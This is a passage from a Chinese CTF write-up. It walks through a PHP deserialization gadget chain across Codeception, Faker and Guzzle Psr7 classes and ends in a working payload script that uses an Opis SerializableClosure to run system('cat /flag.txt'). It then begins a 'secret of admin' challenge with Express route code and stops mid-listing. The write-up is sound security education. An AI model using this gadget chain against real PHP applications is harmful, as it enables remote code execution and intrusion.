                <span class="token variable">$diff</span> <span class="token operator">=</span> <span class="token variable">$byte</span> <span class="token operator">-</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">stream</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">stream</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token variable">$length</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">stream</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token variable">$length</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$remaining</span> <span class="token operator">=</span> <span class="token variable">$length</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$remaining</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

            <span class="token variable">$remoteData</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">remoteStream</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span>
                <span class="token variable">$remaining</span> <span class="token operator">+</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">skipReadBytes</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">skipReadBytes</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$remoteData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$remoteData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$remoteData</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">skipReadBytes</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">skipReadBytes</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">skipReadBytes</span> <span class="token operator">-</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token variable">$data</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$remoteData</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">stream</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$remoteData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>触发call_user_func</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">namespace</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7</span><span class="token punctuation">;</span>


<span class="token keyword">class</span> <span class="token class-name">PumpStream</span>
<span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$size</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$tellPos</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$metadata</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$buffer</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">size</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token variable">$length</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">buffer</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token variable">$length</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$readLen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tellPos</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token variable">$readLen</span><span class="token punctuation">;</span>
        <span class="token variable">$remaining</span> <span class="token operator">=</span> <span class="token variable">$length</span> <span class="token operator">-</span> <span class="token variable">$readLen</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$remaining</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">pump</span><span class="token punctuation">(</span><span class="token variable">$remaining</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$data</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">buffer</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token variable">$remaining</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tellPos</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token variable">$readLen</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">pump</span><span class="token punctuation">(</span><span class="token variable">$length</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">do</span> <span class="token punctuation">{</span>
                <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">,</span> <span class="token variable">$length</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token operator">===</span> <span class="token boolean">false</span> <span class="token operator">||</span> <span class="token variable">$data</span> <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
                    <span class="token keyword">return</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">buffer</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$length</span> <span class="token operator">-</span><span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>先进入口，进stopProcess，这里面调用了<code>$process</code>的<code>isRunning</code>和<code>getCommandLine</code>方法，而process我们完全不知道是什么东西，所以这个调用自然是无法正常完成的，那么直接把这个process变成那个<code>DefaultGenerator</code>类，直接调<code>__call</code>。之前的那个if判断没什么触发点，但是<code>getCommandLine</code>这里是把返回值和字符串拼接了的，那么让这个<code>__call</code>魔法方法直接返回拥有<code>__toString</code>的<code>AppendStream</code>类，可以再触发一个<code>__toString</code>，就这样把魔法方法都用完了</p>
<p>直接跟进AppendStream这个类，<code>__toString</code>进<code>rewind</code>进<code>seek</code>，该函数中能调用其他stream的<code>rewind</code>函数，这里还有两个Stream类，且只有<code>CacheStream</code>有rewind函数，那么进它的rewind看看，同样进seek，其中调用的大多都是自己的函数，唯一一个调其他stream的是一个没什么用的<code>getSize</code>函数，但是seek最后还调用了一个<code>read</code>函数，且这个read函数一开头就调用了其他类的read函数。那么就只能进最后一个类了，最后这个类的read函数进<code>pump</code>函数，pump函数里面有一句<code>call_user_func</code>，算是抵达危险目的地了<br>但是如果仔细跟一下的话还是会发现，这里的第二个参数<code>$length</code>一定是个数字，好像没有那种不要参数或者数字参数能执行什么命令的，因此还要突破</p>
<p>搜到一篇文章，里面有这么一段话</p>
<blockquote>
<p>不同的是这一POC使用vendor&#x2F;opis&#x2F;closure&#x2F;src&#x2F;SerializableClosure.php来构造可利用的匿名函数，避开特定参数的构造，\Opis\Closure可用于序列化匿名函数，使得匿名函数同样可以进行序列化操作。<br>在中有__invoke()函数并且里面有call_user_func函数，当尝试以调用函数的方式调用一个对象时，__invoke()方法会被自动调用。<br><code>call_user_func_array($this-&gt;closure, func_get_args());</code><br>这意味着我们可以序列化一个匿名函数，然后交由上述的$closure($value, $this-&gt;data)调用，将会触发SerializableClosure.php的__invoke执行。</p>
</blockquote>
<p>题目是给了这个<code>SerializableClosure</code>类的，这个类允许我们序列化一个匿名函数（正常情况下是不能序列化匿名函数的），而这个类存在一个invoke方法，触发时调用如上代码，那么整个payload的最后一环就由一个我们可控的任意代码执行的匿名函数解决</p>
<p>payload(这里给了autoload就能直接写payload还能直接测试，挺方便的)</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token shell-comment comment"># https:</span><span class="token comment" spellcheck="true">//www.anquanke.com/post/id/187819</span>
<span class="token comment" spellcheck="true">//namespace Codeception\Extension {</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">//    class RunProcess</span>
<span class="token comment" spellcheck="true">//    {</span>
<span class="token comment" spellcheck="true">//        // destruct</span>
<span class="token comment" spellcheck="true">//        protected $output;</span>
<span class="token comment" spellcheck="true">//        protected $config = ['sleep' => 0];</span>
<span class="token comment" spellcheck="true">//        protected static $events = [];</span>
<span class="token comment" spellcheck="true">//        private $processes = [];</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">//        function __construct($processes, $output)</span>
<span class="token comment" spellcheck="true">//        {</span>
<span class="token comment" spellcheck="true">//            $this->processes = $processes;</span>
<span class="token comment" spellcheck="true">//            $this->output = $output;</span>
<span class="token comment" spellcheck="true">//        }</span>
<span class="token comment" spellcheck="true">//    }</span>
<span class="token comment" spellcheck="true">//}</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">//namespace Faker {</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">//    class DefaultGenerator</span>
<span class="token comment" spellcheck="true">//    {</span>
<span class="token comment" spellcheck="true">//        // call</span>
<span class="token comment" spellcheck="true">//        protected $default;</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">//        function __construct($default)</span>
<span class="token comment" spellcheck="true">//        {</span>
<span class="token comment" spellcheck="true">//            $this->default = $default;</span>
<span class="token comment" spellcheck="true">//        }</span>
<span class="token comment" spellcheck="true">//    }</span>
<span class="token comment" spellcheck="true">//}</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">//namespace GuzzleHttp\Psr7 {</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">//    class AppendStream</span>
<span class="token comment" spellcheck="true">//    {</span>
<span class="token comment" spellcheck="true">//        // tostring</span>
<span class="token comment" spellcheck="true">//        private $streams = [];</span>
<span class="token comment" spellcheck="true">//        private $seekable = true;</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">//        function __construct($streams)</span>
<span class="token comment" spellcheck="true">//        {</span>
<span class="token comment" spellcheck="true">//            $this->seekable = true;</span>
<span class="token comment" spellcheck="true">//            $this->streams = $streams;</span>
<span class="token comment" spellcheck="true">//        }</span>
<span class="token comment" spellcheck="true">//    }</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">//    class CachingStream</span>
<span class="token comment" spellcheck="true">//    {</span>
<span class="token comment" spellcheck="true">//        private $remoteStream;</span>
<span class="token comment" spellcheck="true">//        private $skipReadBytes = 0;</span>
<span class="token comment" spellcheck="true">//        function __construct($stream, $remoteStream)</span>
<span class="token comment" spellcheck="true">//        {</span>
<span class="token comment" spellcheck="true">//            $this->stream = $stream;</span>
<span class="token comment" spellcheck="true">//            $this->remoteStream = $remoteStream;</span>
<span class="token comment" spellcheck="true">//        }</span>
<span class="token comment" spellcheck="true">//    }</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">//    class PumpStream</span>
<span class="token comment" spellcheck="true">//    {</span>
<span class="token comment" spellcheck="true">//        private $source;</span>
<span class="token comment" spellcheck="true">//        private $size;</span>
<span class="token comment" spellcheck="true">//        private $tellPos;</span>
<span class="token comment" spellcheck="true">//        private $metadata;</span>
<span class="token comment" spellcheck="true">//        private $buffer;</span>
<span class="token comment" spellcheck="true">//        function __construct($source, $buffer)</span>
<span class="token comment" spellcheck="true">//        {</span>
<span class="token comment" spellcheck="true">//            $this->source = $source;</span>
<span class="token comment" spellcheck="true">//            $this->buffer = $buffer;</span>
<span class="token comment" spellcheck="true">//            $this->tellPos = 0;</span>
<span class="token comment" spellcheck="true">//            $this->size = -1;</span>
<span class="token comment" spellcheck="true">//        }</span>
<span class="token comment" spellcheck="true">//    }</span>
<span class="token comment" spellcheck="true">//}</span>

<span class="token keyword">namespace</span> <span class="token punctuation">{</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"closure/autoload.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">myloader</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">require_once</span> <span class="token string">'./class/'</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token string">"myloader"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">"system('cat /flag.txt');"</span><span class="token punctuation">;</span>
    <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">use</span> <span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token variable">$closure</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>Opis<span class="token punctuation">\</span>Closure<span class="token punctuation">\</span>SerializableClosure</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$rubbish</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>Faker<span class="token punctuation">\</span>DefaultGenerator</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$pStream</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>GuzzleHttp<span class="token punctuation">\</span>Psr7<span class="token punctuation">\</span>PumpStream</span><span class="token punctuation">(</span><span class="token variable">$closure</span><span class="token punctuation">,</span> <span class="token variable">$rubbish</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$false</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>Faker<span class="token punctuation">\</span>DefaultGenerator</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$cStream</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>GuzzleHttp<span class="token punctuation">\</span>Psr7<span class="token punctuation">\</span>CachingStream</span><span class="token punctuation">(</span><span class="token variable">$pStream</span><span class="token punctuation">,</span> <span class="token variable">$false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$aStream</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>GuzzleHttp<span class="token punctuation">\</span>Psr7<span class="token punctuation">\</span>AppendStream</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$cStream</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$retaStream</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>Faker<span class="token punctuation">\</span>DefaultGenerator</span><span class="token punctuation">(</span><span class="token variable">$aStream</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>Faker<span class="token punctuation">\</span>DefaultGenerator</span><span class="token punctuation">(</span><span class="token variable">$closure</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$runProcess</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Codeception<span class="token punctuation">\</span>Extension<span class="token punctuation">\</span>RunProcess</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$retaStream</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$runProcess</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h2 id="secret-of-admin"><a href="#secret-of-admin" class="headerlink" title="secret of admin"></a>secret of admin</h2><p>给了源码，代码不多，可以从db中看到admin账户和密码，直接登录，但flag在superuser下，且代码<br>主要代码在index.ts下，这两个路由比较关键</p>
<pre class=" language-javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> checkAuth<span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> <span class="token punctuation">{</span> content <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> content <span class="token operator">==</span> <span class="token string">''</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">)</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'on'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">// even admin can't be trusted right ? :)  </span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> error<span class="token punctuation">:</span> <span class="token string">'Forbidden word 🤬'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">let</span> template <span class="token operator">=</span> <span class="token template-string"><span class="token string">`
        &lt;html>
        &lt;meta charset="utf8">
        &lt;title>Create your own pdfs&lt;/title>
        &lt;body>
        &lt;h3></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>content<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/h3>
        &lt;/body>
        &lt;/html>
        `</span></span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">const</span> filename <span class="token operator">=</span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">uuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.pdf`</span></span>
            pdf<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> <span class="token punctuation">{</span>
                <span class="token string">"format"</span><span class="token punctuation">:</span> <span class="token string">"Letter"</span><span class="token punctuation">,</span>
                <span class="token string">"orientation"</span><span class="token punctuation">:</span> <span class="token string">"portrait"</span><span class="token punctuation">,</span>
                <span class="token string">"border"</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span>
                <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"pdf"</span><span class="token punctuation">,</span>
                <span class="token string">"renderDelay"</span><span class="token punctuation">:</span> <span class="token number">3000</span><span class="token punctuation">,</span>
                <span class="token string">"timeout"</span><span class="token punctuation">:</span> <span class="token number">5000</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toFile</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./files/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>filename<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> _<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token function">createError</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">const</span> checksum <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getCheckSum</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">await</span> DB<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token string">'superuser'</span><span class="token punctuation">,</span> filename<span class="token punctuation">,</span> checksum<span class="token punctuation">)</span>
                <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> message <span class="token punctuation">:</span> <span class="token template-string"><span class="token string">`Your pdf is successfully saved 🤑 You know how to download it right?`</span></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">err</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> error <span class="token punctuation">:</span> <span class="token string">'Failed to generate pdf 😥'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// You can also add file logs here!</span>
router<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/api/files'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>socket<span class="token punctuation">.</span>remoteAddress<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/^.*:/</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token function">createError</span><span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">let</span> <span class="token punctuation">{</span> username <span class="token punctuation">,</span> filename<span class="token punctuation">,</span> checksum <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"string"</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"string"</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span><span class="token punctuation">(</span>checksum<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">await</span> DB<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> checksum<span class="token punctuation">)</span>
            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Done'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">err</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Error!'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Parameters error'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    
